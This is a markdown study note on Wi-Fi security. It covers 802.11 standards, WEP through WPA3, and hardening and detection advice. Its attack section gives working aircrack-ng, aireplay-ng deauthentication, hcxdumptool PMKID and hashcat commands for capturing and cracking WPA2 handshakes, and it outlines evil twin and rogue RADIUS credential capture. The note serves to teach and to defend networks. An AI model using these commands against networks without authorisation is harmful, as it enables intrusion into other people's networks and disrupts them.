---
title: Wireless Security
tags: '["fundamentals", "intermediate", "wireless", "802.11", "WPA", "WPA3",
  "wifi-security"]'
topic: Wireless Security
difficulty: intermediate
created: 2026-03-26
updated: 2026-03-26
source: IEEE 802.11 standard, NIST SP 800-97, Wi-Fi Alliance WPA3 specification
---

# 📶 Wireless Security

## Overview
Wireless networks introduce unique attack surfaces because radio signals are broadcast into physical space — anyone within range can attempt to interact with them. Understanding 802.11 security protocols, their weaknesses, and how to defend wireless networks is essential for security practitioners.

> ⚠️ All techniques in this note are for authorised testing, research, and defence only. Attacking wireless networks you don't own is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws globally.

---

## 802.11 Standards Reference

| Standard | Frequency | Max Speed | Notes |
|---|---|---|---|
| 802.11a | 5 GHz | 54 Mbps | Legacy — rarely seen |
| 802.11b | 2.4 GHz | 11 Mbps | Legacy |
| 802.11g | 2.4 GHz | 54 Mbps | Legacy |
| 802.11n (Wi-Fi 4) | 2.4/5 GHz | 600 Mbps | MIMO; still common |
| 802.11ac (Wi-Fi 5) | 5 GHz | ~3.5 Gbps | MU-MIMO; dominant standard |
| 802.11ax (Wi-Fi 6/6E) | 2.4/5/6 GHz | ~9.6 Gbps | OFDMA; current standard |
| 802.11be (Wi-Fi 7) | 2.4/5/6 GHz | ~46 Gbps | Emerging as of 2024 |

---

## Wireless Security Protocols

### WEP (Wired Equivalent Privacy) — Broken
- Uses RC4 stream cipher with static 40 or 104-bit key
- **Critically broken** — IVs (Initialisation Vectors) repeat after ~5,000 packets
- Crackable in minutes regardless of password length
- **Never use WEP.** If you encounter it, it is a critical finding.

### WPA (Wi-Fi Protected Access) — Deprecated
- Introduced as temporary fix for WEP vulnerabilities (2003)
- Uses TKIP (Temporal Key Integrity Protocol) — RC4 based, per-packet key mixing
- **Deprecated** — multiple vulnerabilities; should not be used

### WPA2 — Current Standard (Use When WPA3 Unavailable)
- Uses AES-CCMP (Counter Mode with CBC-MAC Protocol) — much stronger than TKIP
- Two modes:
  - **WPA2-Personal (PSK):** Pre-shared key — home and small office use
  - **WPA2-Enterprise:** 802.1X authentication via RADIUS server — enterprise use
- **Vulnerability:** WPA2-Personal is vulnerable to offline dictionary attacks if 4-way handshake is captured
- PMKID attack allows offline cracking without capturing a full handshake

### WPA3 — Recommended (2018+)
- Replaces Pre-Shared Key with SAE (Simultaneous Authentication of Equals)
- **Forward secrecy:** Each session uses a unique key — capturing one session doesn't decrypt others
- **Dragonblood vulnerabilities** (2019): Side-channel attacks against SAE were discovered and patched — ensure firmware is updated
- WPA3-Enterprise adds 192-bit security mode
- **Use WPA3 whenever available on both AP and clients**

### 802.1X / WPA2-Enterprise
- Clients authenticate to a RADIUS server using EAP (Extensible Authentication Protocol)
- No shared password — each user has individual credentials or certificates
- EAP methods: EAP-TLS (certificate-based, strongest), PEAP, EAP-TTLS
- Prevents password sharing; enables per-user logging

---

## Wireless Attack Techniques

### Reconnaissance
```bash
# Put adapter in monitor mode
sudo airmon-ng check kill   # Kill interfering processes
sudo airmon-ng start wlan0  # Start monitor mode on wlan0
# Creates wlan0mon interface

# Scan for access points
sudo airodump-ng wlan0mon

# Output:
# BSSID = AP MAC address
# PWR = signal strength
# Beacons = beacon frames sent
# #Data = data packets
# CH = channel
# ENC = encryption type (WPA2, WPA3, OPN)
# ESSID = network name

# Capture focused on specific AP
sudo airodump-ng wlan0mon -c [channel] --bssid [AP_MAC] -w capture
```

### WPA2-Personal: 4-Way Handshake Capture & Crack
The 4-way handshake occurs when a client connects to the AP. Capturing it allows offline dictionary attack.

```bash
# Step 1: Start capture focused on target AP
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture

# Step 2: Accelerate handshake capture by de-authenticating connected clients
# (forces them to reconnect — new handshake captured)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -0 5 = send 5 deauth frames
# -a = BSSID (AP)
# -c = client MAC (or omit to broadcast deauth to all clients)

# Step 3: Watch for "WPA handshake:" in airodump header — handshake captured

# Step 4: Crack with aircrack-ng
aircrack-ng handshake_capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Or crack with Hashcat (faster — uses GPU)
# Convert cap to hashcat format
hcxpcapngtool -o hash.hc22000 handshake_capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### PMKID Attack (No Client Required)
The PMKID (Pairwise Master Key Identifier) is transmitted in the first EAPOL frame. It can be obtained without waiting for a client to connect.

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

### Evil Twin / Rogue AP Attack
Creates a duplicate AP with stronger signal to force clients to connect to the attacker's network.

```
Attack flow:
1. Identify target network (SSID, BSSID, channel)
2. Create identical SSID on attacker-controlled AP
3. Jam the legitimate AP (de-auth flood) → clients disconnect
4. Clients reconnect to stronger evil twin AP
5. Capture credentials via captive portal or traffic inspection

Tools: hostapd-wpe (WPA Enterprise attacks), airbase-ng, mitmproxy
```

> **Defensive note:** WPA3-SAE and 802.1X with certificate authentication significantly mitigate evil twin attacks because the client verifies the server's certificate.

### WPA Enterprise: PEAP Downgrade / Credential Capture
```bash
# hostapd-wpe: Rogue RADIUS server that captures PEAP/MSCHAPv2 credentials
# When clients connect to evil twin and attempt PEAP auth:
# → Credentials (username + NTLMv2 hash) captured
# → Crack NTLMv2 with Hashcat (-m 5600)
```

---

## Wireless Tools

| Tool | Purpose |
|---|---|
| `aircrack-ng` suite | Capture, inject, crack WPA/WPA2 handshakes |
| `airodump-ng` | Passive wireless scanner / capture |
| `aireplay-ng` | Packet injection (deauth attacks) |
| `airmon-ng` | Enable/disable monitor mode |
| `hcxdumptool` | PMKID capture |
| `hcxpcapngtool` | Convert pcap to hashcat formats |
| `hashcat` | GPU-accelerated WPA2 cracking (mode 22000) |
| `hostapd-wpe` | Rogue AP / WPA Enterprise credential capture |
| `kismet` | Wireless IDS / passive recon |
| `Wireshark` | Decrypt and analyse captured wireless traffic |
| `bettercap` | Full MITM framework including wireless |

---

## Wireless Security Hardening (Blue Team)

### Access Point Configuration
```
✅ Use WPA3 if all devices support it; WPA2-AES (CCMP) minimum
✅ Disable WEP and WPA/TKIP entirely — no fallback
✅ Use a strong, random passphrase (20+ chars, high entropy)
✅ Disable WPS (Wi-Fi Protected Setup) — multiple known vulnerabilities
✅ Enable Management Frame Protection (802.11w) — prevents deauth attacks
✅ Separate IoT devices onto isolated VLAN/SSID
✅ Disable SSID broadcast only as minor deterrent (not real security)
✅ Enable wireless IDS features if AP supports it
```

### Enterprise Wireless (802.1X Best Practices)
```
✅ Use EAP-TLS (certificate-based) over PEAP where possible
✅ Configure clients to verify server certificate and CA
✅ Use a dedicated RADIUS server (e.g., FreeRADIUS, Microsoft NPS)
✅ Segment wireless from wired network — wireless users in their own VLAN
✅ Deploy wireless IDS (Kismet, Cisco wIPS, Aruba RFProtect)
✅ Monitor for rogue APs continuously
```

### Detection of Wireless Attacks
```
Deauth flood: Excessive 802.11 deauthentication frames from non-AP MAC
Evil twin: Duplicate SSID with different BSSID
PMKID capture: Unusual EAPOL traffic
Probe requests: Devices searching for hidden networks
Signal anomalies: Known AP broadcasting from unexpected location/signal strength
```

---

## Key Terms

| Term | Definition |
|---|---|
| SSID | Service Set Identifier — the network name |
| BSSID | Basic Service Set Identifier — the AP's MAC address |
| ESSID | Extended SSID — same as SSID in most contexts |
| Monitor mode | NIC captures all wireless frames, not just those addressed to it |
| Promiscuous mode | Wired equivalent — capture all frames on the segment |
| Deauthentication | 802.11 management frame telling a client to disconnect |
| 4-way handshake | WPA2 exchange that establishes session keys — target for capture/crack |
| PMKID | Identifier derived from PMK — allows offline crack without full handshake |
| SAE | Simultaneous Authentication of Equals — WPA3's password exchange protocol |
| RADIUS | Remote Authentication Dial-In User Service — auth server for 802.1X |
| EAP | Extensible Authentication Protocol — framework used with 802.1X |

---

## Related Notes
- Networking-Basics
- Cryptography-Basics
- Hashcat
- Network-Defense-Blue-Team
- Common-Ports

## Sources

Institute of Electrical and Electronics Engineers. (2020). *IEEE standard for information technology — telecommunications and information exchange between systems — local and metropolitan area networks — specific requirements: Part 11: Wireless LAN medium access control (MAC) and physical layer (PHY) specifications* (IEEE 802.11-2020). IEEE. https://standards.ieee.org/ieee/802.11

National Institute of Standards and Technology. (2007). *Establishing wireless robust security networks: A guide to IEEE 802.11i* (NIST SP 800-97). U.S. Department of Commerce. https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-97.pdf

Wi-Fi Alliance. (2024). *Wi-Fi protected access 3 (WPA3) specification*. Wi-Fi Alliance. https://www.wi-fi.org/discover-wi-fi/security

aircrack-ng Project. (2024). *Aircrack-ng documentation*. https://www.aircrack-ng.org/documentation.html

Vanhoef, M., & Ronen, E. (2019). *Dragonblood: Analyzing the dragonfly handshake of WPA3 and EAP-pwd*. https://papers.mathyvanhoef.com/dragonblood.pdf

---
<- [[Fundamentals-MOC]]